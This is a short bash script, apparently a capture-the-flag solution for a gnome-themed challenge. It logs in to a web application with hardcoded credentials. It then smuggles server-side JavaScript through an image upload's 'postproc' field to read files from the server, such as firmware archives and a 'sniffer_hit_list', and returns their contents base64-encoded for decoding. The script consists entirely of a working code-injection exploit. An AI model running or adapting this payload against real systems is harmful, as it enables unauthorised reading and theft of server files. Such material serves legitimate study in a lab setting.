#!/bin/bash

USERNAME="admin"
PASSWORD="SittingOnAShelf"
IP="127.0.0.1"

#Authentication
curl -v -c data http://${IP}/
curl -v -b data -c data -d "username=${USERNAME}" -d "password=${PASSWORD}" http://${IP}/
#Upload a fake image, and insert code into the postproc parameter
for I in 20151203133815.zip factory_cam_4.zip  gnome.conf gnome_firmware_rel_notes.txt sgnet.zip sniffer_hit_list.txt
do
curl -b data -F "postproc=require('fs').readFileSync(\"/gnome/www/files/${I}\").toString('base64')"  -F "file=@foo.png;type=image/png" -o ${I}.preb64  http://${IP}/files
cat ${I}.preb64 | perl -ne 'print "$1" if(/Post process result: (.*)\<\/p\>\<p class/)' > ${I}.b64  2>/dev/null
python decode.py ${I}.b64 ${I}
done
